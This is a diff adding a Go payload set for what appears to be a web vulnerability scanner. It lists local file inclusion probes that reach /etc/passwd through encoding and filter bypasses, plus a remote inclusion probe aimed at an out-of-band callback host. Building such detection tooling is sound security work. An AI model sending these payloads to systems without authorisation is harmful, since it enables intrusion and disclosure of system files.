@@ -1,0 +1,80 @@
+package payloads
+
+// FileInclusionPayloads returns non-destructive local and remote file inclusion
+// probes based on the upstream File Inclusion section.
+func FileInclusionPayloads() PayloadSet {
+	return PayloadSet{
+		Category:    CatFileInclusion,
+		Description: "Local and Remote File Inclusion probes - PayloadsAllTheThings / CWE-98",
+		Version:     "2026-08-27",
+		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a1/File%20Inclusion",
+		Payloads: []Payload{
+			{
+				ID: "file-inclusion-unix-passwd", Category: CatFileInclusion,
+				Technique: TechClassic, Name: "Unix passwd Include", Value: `../../../etc/passwd`,
+				Contexts:  []InjectionContext{CtxURLQuery, CtxURLPath, CtxFormBody},
+				Detection: DetectReflection, DetectSignature: `root:.*:0:0:`,
+				Severity: SevHigh, SafeMode: true, RiskLevel: "SAFE", TargetStack: []string{"Linux", "Unix"},
+				CWE: "CWE-98", OWASPCategory: "A03:2021",
+				Description: "Local file inclusion probe for the Unix passwd file",
+				Reference:   "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a1/File%20Inclusion/README.md#local-file-inclusion",
+				Tags:        []string{"lfi", "unix", "probe"}, Enabled: true,
+			},
+			{
+				ID: "file-inclusion-unix-passwd-double-encoded", Category: CatFileInclusion,
+				Technique: TechEncoded, Name: "Double-Encoded Unix passwd Include", Value: `..%252f..%252f..%252fetc%252fpasswd`,
+				Contexts:  []InjectionContext{CtxURLQuery, CtxURLPath},
+				Detection: DetectReflection, DetectSignature: `root:.*:0:0:`,
+				Severity: SevHigh, SafeMode: true, RiskLevel: "SAFE", TargetStack: []string{"Linux", "Unix"},
+				CWE: "CWE-98", OWASPCategory: "A03:2021",
+				Description: "Double URL-encoded local file inclusion probe for multi-pass decoders",
+				Reference:   "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a1/File%20Inclusion/README.md#double-encoding",
+				Tags:        []string{"lfi", "encoding", "waf-bypass"}, Enabled: true,
+			},
+			{
+				ID: "file-inclusion-unix-passwd-overlong", Category: CatFileInclusion,
+				Technique: TechEncoded, Name: "Overlong UTF-8 Unix passwd Include", Value: `..%c0%ae..%c0%ae/%c0%ae%c0%ae/etc/passwd`,
+				Contexts:  []InjectionContext{CtxURLQuery, CtxURLPath},
+				Detection: DetectReflection, DetectSignature: `root:.*:0:0:`,
+				Severity: SevMedium, SafeMode: true, RiskLevel: "SAFE", TargetStack: []string{"Linux", "Unix"},
+				CWE: "CWE-98", OWASPCategory: "A03:2021",
+				Description: "Overlong UTF-8 path encoding probe from the upstream LFI examples",
+				Reference:   "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a1/File%20Inclusion/README.md#utf-8-encoding",
+				Tags:        []string{"lfi", "encoding"}, Enabled: true,
+			},
+			{
+				ID: "file-inclusion-null-byte", Category: CatFileInclusion,
+				Technique: TechFilterBypass, Name: "Null Byte Extension Bypass", Value: `../../../etc/passwd%00.png`,
+				Contexts:  []InjectionContext{CtxURLQuery, CtxURLPath},
+				Detection: DetectReflection, DetectSignature: `root:.*:0:0:`,
+				Severity: SevMedium, SafeMode: true, RiskLevel: "SAFE", TargetStack: []string{"PHP", "Perl"},
+				CWE: "CWE-98", OWASPCategory: "A03:2021",
+				Description: "Null byte truncation probe for legacy extension validation",
+				Reference:   "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a1/File%20Inclusion/README.md#null-byte",
+				Tags:        []string{"lfi", "null-byte", "legacy"}, Enabled: true,
+			},
+			{
+				ID: "file-inclusion-dot-filter-bypass", Category: CatFileInclusion,
+				Technique: TechFilterBypass, Name: "Dot Filter Bypass", Value: `....//....//etc/passwd`,
+				Contexts:  []InjectionContext{CtxURLQuery, CtxURLPath},
+				Detection: DetectReflection, DetectSignature: `root:.*:0:0:`,
+				Severity: SevHigh, SafeMode: true, RiskLevel: "SAFE", TargetStack: []string{"Linux", "Unix"},
+				CWE: "CWE-98", OWASPCategory: "A03:2021",
+				Description: "Repeated-dot and slash normalization bypass for local file inclusion",
+				Reference:   "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a1/File%20Inclusion/README.md#filter-bypass",
+				Tags:        []string{"lfi", "filter-bypass"}, Enabled: true,
+			},
+			{
+				ID: "file-inclusion-remote-oob", Category: CatFileInclusion,
+				Technique: TechOOB, Name: "Remote File Inclusion OOB Probe", Value: `http://VYOMITE_OOB_HOST/vyomite-rfi.txt`,
+				Contexts:  []InjectionContext{CtxURLQuery, CtxFormBody},
+				Detection: DetectOOBCallback,
+				Severity:  SevCritical, SafeMode: false, RiskLevel: "ACTIVE", TargetStack: []string{"PHP"},
+				CWE: "CWE-98", OWASPCategory: "A03:2021",
+				Description: "Remote file inclusion probe using the configured out-of-band listener",
+				Reference:   "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a1/File%20Inclusion/README.md#remote-file-inclusion",
+				Tags:        []string{"rfi", "oob"}, Enabled: true,
+			},
+		},
+	}
+}
